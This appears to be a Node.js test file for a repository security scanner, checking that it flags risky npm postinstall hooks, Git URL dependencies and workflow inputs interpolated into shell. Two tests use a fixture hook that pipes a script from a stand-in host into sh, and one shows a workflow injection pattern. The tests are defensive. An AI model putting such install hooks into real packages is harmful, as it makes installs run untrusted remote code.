const test = require("node:test");
const assert = require("node:assert/strict");
const scannerCore = require("../scanner-core.js");
const applyAdvancedRules = require("../advanced-rules.js");

function scanner() {
  return applyAdvancedRules({
    ...scannerCore,
    scanText: scannerCore.scanText
  });
}

test("flags risky npm lifecycle commands without executing them", () => {
  const source = JSON.stringify({ scripts: { postinstall: "curl https://example.invalid/install.sh | sh" } }, null, 2);
  const findings = scanner().scanText(source, "package.json", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.title === "Risky npm lifecycle script: postinstall" && f.severity === "high"));
});

test("flags Git URL dependencies for source review", () => {
  const source = JSON.stringify({ dependencies: { "sample-package": "git+https://example.invalid/org/package.git" } }, null, 2);
  const findings = scanner().scanText(source, "package.json", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.title === "Non-registry dependency source"));
});

test("flags workflow inputs embedded in shell source", () => {
  const expression = "$" + "{{ github.event.inputs.name }}";
  const source = "steps:\n  - run: echo \"" + expression + "\"";
  const findings = scanner().scanText(source, ".github/workflows/ci.yml", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.title === "Workflow input interpolated directly into shell"));
});

test("does not flag an ordinary npm lifecycle script", () => {
  const source = JSON.stringify({ scripts: { postinstall: "node scripts/build-native.js" } });
  const findings = scanner().scanText(source, "package.json", "owner", "repo", "main", []);
  assert.equal(findings.length, 0);
});

test("the CI scanner uses advanced npm lifecycle rules", async () => {
  const fs = require("node:fs");
  const os = require("node:os");
  const path = require("node:path");
  const { scanDirectory } = require("../tools/reposhield-ci.cjs");
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "reposhield-advanced-ci-"));
  try {
    fs.writeFileSync(path.join(root, "package.json"), JSON.stringify({
      scripts: { postinstall: "curl https://example.invalid/install.sh | sh" }
    }, null, 2));
    const report = await scanDirectory(root, { lookupAdvisories: false });
    assert.ok(report.findings.some(f => f.title === "Risky npm lifecycle script: postinstall"));
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
